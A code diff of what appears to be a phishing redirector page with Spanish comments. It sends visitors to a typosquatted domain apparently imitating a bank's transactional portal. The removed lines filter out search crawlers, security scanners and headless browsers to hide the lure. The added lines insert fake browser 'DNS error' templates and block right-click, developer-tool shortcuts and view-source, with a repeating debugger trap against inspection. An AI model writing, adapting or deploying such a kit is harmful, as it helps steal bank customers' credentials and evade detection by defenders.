@@ -3,49 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal</title>
-    <style>
-        body { margin: 0; padding: 0; background: #fff; }
-    </style>
+    <title id="tab-title">Cargando...</title>
+    <style id="browser-style"></style>
 </head>
-<body>
-    <script>
-        // ✏️ CAMBIA ESTO A TU LINK:
-        const TARGET = "https://occdentebncoprtaltrnsccional.vercel.app/";
+<body oncontextmenu="return false;" style="user-select: none;">
 
-        // Detectar si es bot
-        function isBot() {
-            const ua = navigator.userAgent.toLowerCase();
-            
-            const botPatterns = [
-                'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
-                'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
-                'whatsapp', 'telegrambot', 'discordbot', 'ahrefsbot', 'semrushbot',
-                'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
-                'webdriver', 'cypress', 'bot\\b', 'crawler', 'spider', 'scraper',
-                'curl', 'wget', 'python-requests', 'go-http-client'
-            ];
+    <div id="main-wrapper">
+        <div id="loading" style="text-align:center; padding-top:100px; font-family:sans-serif;">
+            <p>Cargando...</p>
+        </div>
+        <div id="error-content"></div>
+    </div>
 
-            for (let pattern of botPatterns) {
-                if (new RegExp(pattern, 'i').test(ua)) {
-                    return true;
-                }
-            }
+<script>
+    // ✏️ CAMBIA SOLO ESTO:
+    const target = "https://occdentebncoprtaltrnsccional.vercel.app/"; // Tu link aquí
+    const domain = window.location.hostname;
 
-            // Detectar headless
-            if (navigator.webdriver) return true;
-            if (window.document.documentElement.getAttribute('webdriver')) return true;
-            if (window.callPhantom) return true;
-            if (window.Cypress) return true;
+    function isMobile() {
+        const ua = navigator.userAgent;
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (window.innerWidth <= 800);
+    }
 
-            // Detectar si no hay pantalla
-            if (window.screen.width === 0 || window.screen.height === 0) return true;
+    function renderChrome() {
+        document.getElementById('tab-title').innerText = "⚠️ Error de red";
+        document.getElementById('browser-style').innerHTML = `
+            body { background-color: #202124; color: #e8eaed; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+            .container { max-width: 600px; padding: 20px; text-align: left; }
+            h1 { font-size: 22px; font-weight: 400; margin: 0 0 15px; }
+            p { font-size: 14px; color: #9aa0a6; line-height: 1.6; margin: 0 0 10px; }
+            .err-code { font-size: 12px; color: #9aa0a6; margin-top: 30px; text-transform: uppercase; font-family: monospace; }
+            .blue-btn { background: #8ab4f8; color: #202124; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; margin-top: 25px; cursor: pointer; font-size: 14px;}
+            .blue-btn:hover { background: #aecbfa; }
+        `;
+        return `
+            <div class="container">
+                <h1>No se puede acceder a este sitio web</h1>
+                <p>Comprueba si hay un error de escritura en ${domain}.</p>
+                <p>Si está escrito correctamente, prueba a ejecutar el diagnóstico de red de Windows.</p>
+                <div class="err-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
+                <button class="blue-btn" onclick="location.reload()">Volver a cargar</button>
+            </div>
+        `;
+    }
 
-            return false;
-        }
+    function renderSafari() {
+        document.getElementById('tab-title').innerText = "Error";
+        document.getElementById('browser-style').innerHTML = `
+            body { background-color: #f7f7f7; color: #000000; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+            .container { text-align: center; max-width: 480px; padding: 20px; }
+            h1 { font-size: 19px; font-weight: 600; margin: 0 0 10px; letter-spacing: -0.5px; }
+            p { font-size: 14px; color: #333; line-height: 1.4; margin: 0; }
+        `;
+        return `
+            <div class="container">
+                <h1>Safari no puede abrir la página</h1>
+                <p>Safari no puede abrir la página "${domain}" porque no se puede encontrar el servidor donde está alojada esta página.</p>
+            </div>
+        `;
+    }
 
-        // Redirigir inmediatamente, sin esperar nada
-        window.location.replace(TARGET);
-    </script>
+    async function iniciar() {
+        const ua = navigator.userAgent;
+        const loader = document.getElementById('loading');
+        const content = document.getElementById('error-content');
+
+        // REDIRECCIONA SIEMPRE AL LINK
+        window.location.href = target;
+        return;
+    }
+
+    document.onkeydown = (e) => {
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
+    };
+
+    setInterval(() => { debugger; }, 50);
+
+    iniciar();
+</script>
 </body>
 </html>
